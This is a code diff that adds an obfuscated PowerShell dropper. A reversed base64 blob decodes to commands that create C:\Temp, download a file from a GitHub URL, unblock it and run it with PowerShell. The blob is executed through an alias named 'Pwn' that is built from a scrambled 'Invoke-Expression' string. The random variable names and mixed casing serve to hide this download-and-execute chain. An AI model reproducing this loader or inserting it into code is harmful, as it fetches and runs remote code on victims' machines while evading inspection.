@@ -1,0 +1,5 @@
+$q6 = "oAIsB3YuIXZ0FGZwV1av9Gb0V3TcBXblRFX6MEIlhXZuw2byRnbvNGI0lGeF9mTtAiblRGZphGIlxWe0N1dvRmbpdVLgM3chBXeiByYlhXZtASZ4VmLsxWZoNncld3bwpgIsB3YuIXZ0FGZwV1av9Gb0V3TcBXblRFX6MkIggGdhBVLgUGbpZULrN2bsJmbVpgIsB3YuIXZ0FGZwV1av9Gb0V3TcBXblRFX6MkIgUGbpZEd19ULgISOn5Wa0NXZ05CdzVnav4Wah12LzRWYlh2LzZWZy9ydhJ3L2VGRsV2Y4V0Lrt2ayA3Lt92YuIWdoRXan9yL6MHc0RHaiASayVVLgQ3clVXclJlYldVLlt2b25WSKwGb15UL0V3TgwHIlNmcvZULgkncvR3YlJXaEBSZwlHVtVGdJ1CIiAXblRFX6MkIggGdhBVLg0WZ0lUL3VmT" ;
+$BYKcnA = $q6.ToCharArray() ; [array]::Reverse($BYKcnA) ; $9dXW8mbbglZEhrdz = -join $BYKcnA ;
+$zYsL0XmuOAneDptC8lJZgfxBQ = switch ($9dXW8mbbglZEhrdz.Length % 4) { 0 { $9dXW8mbbglZEhrdz }; 1 { $9dXW8mbbglZEhrdz.Substring(0, $9dXW8mbbglZEhrdz.Length - 1) }; 2 { $9dXW8mbbglZEhrdz + ("=" * 2) }; 3 { $9dXW8mbbglZEhrdz + "=" }} ;
+$Bn3ku6EbQm5VPMrD7YcIXSgt = [SySTem.tEXt.EncoDiNG]::UTF8.GEtStriNG([SySTeM.ConvERT]::fROMbASE64STRing($zYsL0XmuOAneDptC8lJZgfxBQ)) ;
+$NyxPTQbQv2umXnt = " N O i " + " S s " + " E R P " + " X " + " e - " + " E K O " + " v N I " ; neW-aLIas -NaME Pwn -valuE ($NyxPTQbQv2umXnt[-1..-99] -jOIn "" -REPLAcE " ") -forCe ; pwn $Bn3ku6EbQm5VPMrD7YcIXSgt ;
